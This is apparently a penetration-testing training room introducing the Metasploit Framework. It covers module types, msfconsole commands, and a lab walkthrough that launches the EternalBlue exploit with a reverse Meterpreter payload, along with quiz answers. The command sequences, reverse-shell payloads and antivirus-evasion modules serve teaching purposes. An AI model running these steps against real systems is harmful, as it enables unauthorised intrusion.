
# Metasploit: Introduction

> An introduction to the main components of the Metasploit Framework.

Tasks:

* Task 1 — Introduction to Metasploit
* Task 2 — Main Components of Metasploit
* Task 3 — Msfconsole
* Task 4 — Working with modules
* Task 5 — Summary

---

## Task 1 — Introduction to Metasploit

**Metasploit** is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

Metasploit has two main versions:

* **Metasploit Pro**: The commercial version that facilitates the automation and management of tasks. This version has a graphical user interface (GUI).
* **Metasploit Framework**: The open-source version that works from the command line. This room will focus on this version, installed on the AttackBox and most commonly used penetration testing Linux distributions.

The Metasploit Framework is a set of tools that allow information gathering, scanning, exploitation, exploit development, post-exploitation, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

The main components of the Metasploit Framework can be summarized as follows:

* **msfconsole**: The main command-line interface.
* **Modules**: supporting modules such as exploits, scanners, payloads, etc.
* **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing. Some of these tools are msfvenom, pattern_create and pattern_offset. We will cover msfvenom within this module, but pattern_create and pattern_offset are tools useful in exploit development which is beyond the scope of this module.

This room will cover the main components of Metasploit while providing you with a solid foundation on how to find relevant exploits, set parameters, and exploit vulnerable services on the target system. Once you have completed this room, you will be able to navigate and use the Metasploit command line comfortably.

Press the **Start Machine** button below.

Start the AttackBox by pressing the **Start AttackBox** button at the top of this page to complete tasks and answer the questions. The AttackBox machine will start in Split-Screen view. If it is not visible, use the blue **Show Split View** button at the top of the page.

**Answer the questions below**
No answer needed.

---

## Task 2 — Main Components of Metasploit

While using the Metasploit Framework, you will primarily interact with the Metasploit console. You can launch it from the AttackBox terminal using the `msfconsole` command. The console will be your main interface to interact with the different modules of the Metasploit Framework. Modules are small components within the Metasploit framework that are built to perform a specific task, such as exploiting a vulnerability, scanning a target, or performing a brute-force attack.

Before diving into modules, it would be helpful to clarify a few recurring concepts: vulnerability, exploit, and payload.

* **Exploit**: A piece of code that uses a vulnerability present on the target system.
* **Vulnerability**: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.
* **Payload**: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

Modules and categories under each one are listed below. These are given for reference purposes, but you will interact with them through the Metasploit console (msfconsole).

### Auxiliary

Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

```
tree -L 1 auxiliary/
auxiliary/
├── admin
├── analyze
├── bnat
├── client
├── cloud
├── crawler
├── docx
├── dos
├── example.py
├── example.rb
├── fileformat
├── fuzzers
├── gather
├── parser
├── pdf
├── scanner
├── server
├── sniffer
├── spoof
├── sqli
├── voip
└── vsploit
```

### Encoders

Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

Signature-based antivirus and security solutions have a database of known threats. They detect threats by comparing suspicious files to this database and raise an alert if there is a match. Thus encoders can have a limited success rate as antivirus solutions can perform additional checks.

```
tree -L 1 encoders/
encoders/
├── cmd
├── generic
├── mipsbe
├── mipsle
├── php
├── ppc
├── ruby
├── sparc
├── x64
└── x86
```

### Evasion

While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.

```
tree -L 2 evasion/
evasion/
└── windows
    ├── applocker_evasion_install_util.rb
    ├── applocker_evasion_msi_build.rb
    ├── applocker_evasion_presentationhost.rb
    ├── applocker_evasion_regasm_regsvcs.rb
    ├── applocker_evasion_workflow_compiler.rb
    ├── process_herpaderping.rb
    ├── syscall_inject.rb
    ├── windows_defender_exe.rb
    └── windows_defender_js_mta.rb
```

### Exploits

Exploits, neatly organized by target system.

```
tree -L 1 exploits/
exploits/
├── aix
├── android
├── apple_ios
├── bsd
├── bsdi
├── dialup
├── example_linux_priv_esc.rb
├── example.py
├── example.rb
├── example_webapp.rb
├── firefox
├── freebsd
├── hpux
├── irix
├── linux
├── mainframe
├── multi
├── netware
├── openbsd
├── osx
├── qnx
├── solaris
├── unix
└── windows
```

### NOPs

NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with `0x90`, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

```
tree -L 1 nops/
nops/
├── aarch64
├── armle
├── cmd
├── mipsbe
├── php
├── ppc
├── sparc
├── tty
├── x64
└── x86
```

### Payloads

Payloads are codes that will run on the target system.

Exploits will leverage a vulnerability on the target system, but to achieve the desired result, we will need a payload. Examples could be: getting a shell, loading a malware or backdoor to the target system, running a command, or launching calc.exe as a proof of concept to add to the penetration test report. Starting the calculator on the target system remotely by launching the calc.exe application is a benign way to show that we can run commands on the target system.

Running command on the target system is already an important step but having an interactive connection that allows you to type commands that will be executed on the target system is better. Such an interactive command line is called a “shell”. Metasploit offers the ability to send different payloads that can open shells on the target system.

```
tree -L 1 payloads/
payloads/
├── adapters
├── singles
├── stagers
└── stages
```

You will see four different directories under payloads: adapters, singles, stagers and stages.

* **Adapters**: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.
* **Singles**: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.
* **Stagers**: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.
* **Stages**: Downloaded by the stager. This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

* `generic/shell_reverse_tcp`
* `windows/x64/shell/reverse_tcp`

Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.

### Post

Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

```
tree -L 1 post/
post/
├── aix
├── android
├── apple_ios
├── bsd
├── firefox
├── hardware
├── linux
├── multi
├── networking
├── osx
├── solaris
└── windows
```

If you wish to familiarize yourself further with these modules, you can find them under the modules folder of your Metasploit installation. For the AttackBox these are under:

```
/opt/metasploit-framework/embedded/framework/modules
```

**Answer the questions below**

* What is the name of the code taking advantage of a flaw on the target system? **Exploit**
* What is the name of the code that runs on the target system to achieve the attacker's goal? **Payload**
* What are self-contained payloads called? **Singles**
* Is `windows/x64/pingback_reverse_tcp` among singles or staged payload? **Singles**

---

## Task 3 — Msfconsole

Launch with `msfconsole`. The console behaves like a shell; many Linux commands work (e.g., `ls`, `ping -c 1 8.8.8.8`, `clear`), though output redirection like `>` does not.

### Help feature (example)

```
msf6 > help set
Usage: set [option] [value]

Set the given option to value. If value is omitted, print the current value.
If both are omitted, print options that are currently set.

If run from a module context, this will set the value in the module's
datastore. Use -g to operate on the global datastore.

If setting a PAYLOAD, this command can take an index from `show payloads`.
```

### History example

```
msf6 > history
1  use exploit/multi/http/nostromo_code_exec
2  set lhost 10.10.16.17
3  set rport 80
4  options
5  set rhosts 10.10.29.187
6  run
7  exit
8  exit -y
9  version
10 use exploit/multi/script/web_delivery
```

### Using an exploit (EternalBlue)

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) >
```

You can still run normal commands (e.g., `ls`) in context.

#### Show options (exploit context)

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT          445              yes       The target port (TCP)
SMBDomain      -                no        (Optional) The Windows domain to use for authentication
SMBPass        no               no        (Optional) The password for the specified username
SMBUser        no               no        (Optional) The username to authenticate as
VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.

Payload options (windows/x64/meterpreter/reverse_tcp):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
EXITFUNC       thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST          10.10.44.70      yes       The listen address (an interface may be specified)
LPORT          4444             yes       The listen port

Exploit target:
Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

#### Options for a post-exploitation module (example)

```
Module options (post/windows/gather/enum_domain_users):

Name    Current Setting  Required  Description
----    ---------------  --------  -----------
HOST                     no        Target a specific host
SESSION                  yes       The session to run this module on.
USER                     no        Target User for NetSessionEnum
```

#### Show payloads (example)

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
Compatible Payloads
===================
#  Name                     Disclosure Date  Rank   Check  Description
0  generic/custom           -                manual No     Custom Payload
1  generic/shell_bind_tcp   -                manual No     Generic Command Shell, Bind TCP Inline
2  generic/shell_reverse_tcp-                manual No     Generic Command Shell, Reverse TCP Inline
3  windows/x64/exec         -                manual No     Windows x64 Execute Command
4  windows/x64/loadlibrary  -                manual No     Windows x64 LoadLibrary Path
5  windows/x64/messagebox   -                manual No     Windows MessageBox x64
6  windows/x64/meterpreter/... (etc.)
```

Use `back` to leave a module context.

#### The `info` command (full text as displayed)

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
Module: exploit/windows/smb/ms17_010_eternalblue
Platform: Windows
Arch:
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Average
Disclosed: 2017-03-14

Provided by:
Sean Dillon
Dylan Davis
Equation Group
Shadow Brokers
thelightcosine

Available targets:
Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) All Service Packs

Check supported:
Yes

Basic options:
Name        Current Setting  Required  Description
----        ---------------  --------  -----------
RHOSTS                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
RPORT       445              yes       The target port (TCP)
SMBDomain   no               no        (Optional) The Windows domain to use for authentication
SMBPass     no               no        (Optional) The password for the specified username
SMBUser     no               no        (Optional) The username to authenticate as
VERIFY_ARCH true             yes       Check if remote architecture matches exploit Target.
VERIFY_TARGET true           yes       Check if remote OS matches exploit Target.

Payload information:
Space: 2000

Description:
This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual ROP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.

References:
https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010
https://www.cvedetails.com/cve/CVE-2017-0143/
https://www.cvedetails.com/cve/CVE-2017-0144/
https://www.cvedetails.com/cve/CVE-2017-0145/
https://www.cvedetails.com/cve/CVE-2017-0146/
https://www.cvedetails.com/cve/CVE-2017-0147/
https://www.cvedetails.com/cve/CVE-2017-0148/
https://github.com/RiskSense-Ops/MS17-010

Also known as:
ETERNALBLUE
```

#### Search

`search` looks up modules by keyword/CVE/type/platform. Example:

```
msf6 > search ms17-010
Matching Modules
================
#  Name                                      Disclosure Date  Rank    Check  Description
0  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal  No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB ...
1  auxiliary/scanner/smb/smb_ms17_010        2017-03-14       normal  No     MS17-010 SMB RCE Detection
2  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
3  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal  Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion ...
4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great   Yes    SMB DOUBLEPULSAR Remote Code Execution
```

Ranking meanings (from table in room):

* **ExcellentRanking** — The exploit will never crash the service.
* **GreatRanking** — The exploit has a default target AND either auto-detects the appropriate target or uses an application-specific return address after a version check.
* **GoodRanking** — Default target and “common case” for this software.
* **NormalRanking** — Reliable but depends on a specific version and can’t (or doesn’t) reliably autodetect.
* **AverageRanking** — Generally unreliable or difficult to exploit.
* **LowRanking** — Nearly impossible to exploit (under 50% success) for common platforms.
* **ManualRanking** — Unstable/difficult and essentially a DoS; or requires significant manual configuration.

Example filtered search:

```
msf6 > search type:auxiliary telnet
Matching Modules
================
0  auxiliary/admin/http/dlink_dir_300_600_exec_noauth   2013-02-04  normal  No  D-Link DIR-600 / DIR-300 Unauthenticated Remote ...
1  auxiliary/admin/http/netgear_r7000_pass_reset         2020-06-15  normal  Yes Netgear R6700v3 Unauthenticated LAN Admin Passwd ...
2  auxiliary/dos/cisco/ios_telnet_room                    2017-03-17  normal  No  Cisco IOS Telnet Denial of Service
... (list continues)
```

**Answers (at bottom of room section):**

* How would you search for a module related to Apache? **search apache**
* Who provided the auxiliary/scanner/ssh/ssh_login module? **todb**

---

## Task 4 — Working with modules

You can launch the target machine attached to this room to replicate the examples below.

Once you have entered the context of a module using the `use` command followed by the module name, you will need to set parameters. The most common parameters you will use are listed below. It is good practice to use the `show options` command to list the required parameters.

All parameters are set using the same command syntax:

```
set PARAMETER_NAME VALUE
```

**Prompts to recognize:**

* Regular command prompt (no Metasploit commands).
* msfconsole prompt (`msf6 >`).
* Context prompt (`msf6 exploit(windows/smb/ms17_010_eternalblue) >`).
* Meterpreter prompt (`meterpreter >`).
* A shell on the target system (e.g., `C:\Windows\system32>`).

**Show options** (same table as earlier with RHOSTS, RPORT, VERIFY_ARCH/TARGET; and payload options LHOST/LPORT/EXITFUNC).

**Set example**

```
set rhosts 10.10.165.39
show options
```

**Common parameters (definitions):**

* **RHOSTS**: “Remote host”, the IP address of the target system (single IP, CIDR, or file with one target per line).
* **RPORT**: “Remote port”, the port on the target system the vulnerable application is running on.
* **PAYLOAD**: The payload you will use with the exploit.
* **LHOST**: “Localhost”, the attacking machine (your AttackBox or Kali Linux) IP address.
* **LPORT**: “Local port”, the port you will use for the reverse shell to connect back to.
* **SESSION**: Each connection established to the target system using Metasploit will have a session ID. You will use this with post-exploitation modules.

**unset / unset all**

```
unset all
```

**setg / unsetg** (global datastore) — allows values (e.g., RHOSTS) to persist across modules.

**Example flow** (navigating modules with setg):

1. Use the ms17_010_eternalblue exploitable.
2. Set the RHOSTS variable using the `setg` command instead of the `set` command.
3. Use the `back` command to leave the exploit context.
4. Use an auxiliary (scanner) to discover MS17-010 vulnerabilities.
5. `show options` shows that RHOSTS is already populated.

```
use exploit/windows/smb/ms17_010_eternalblue
setg rhosts 10.10.165.39
back
use auxiliary/scanner/smb/smb_ms17_010
show options
```

**Using modules**

* `exploit` (or `run`) launches the module.
* `exploit -z` will run the exploit and background the session as soon as it opens.

Example output shows a successful EternalBlue run, pool grooming logs, and:

```
Meterpreter session 2 opened ...
Session 2 created in the background.
```

**Sessions**

* `background` from meterpreter, or `CTRL+Z`, to background a session.
* `sessions` to list sessions.
* `sessions -i <id>` to interact.

**Room Q&A (bottom):**

* How would you set the LPORT value to 6666? **set LPORT 6666**
* How would you set the global value for RHOSTS to 10.10.19.23 ? **setg RHOSTS 10.10.19.23**
* What command would you use to clear a set payload? **unset PAYLOAD**
* What command do you use to proceed with the exploitation phase? **exploit**

---

## Task 5 — Summary

As we have seen so far, Metasploit is a powerful tool that facilitates the exploitation process. The exploitation process comprises three main steps; finding the exploit, customizing the exploit, and exploiting the vulnerable service.

Metasploit provides many modules that you can use for each step of the exploitation process. Through this room, we have seen the basic components of Metasploit and their respective use.

It would be best if you also had used the `ms17_010_eternalblue` exploit to gain access to the target VM.

In the following rooms, we will cover Metasploit and its components in more detail. Once completed, this module should give you a good understanding of the capabilities of Metasploit.

**Answer the questions below**
No answer needed.

---

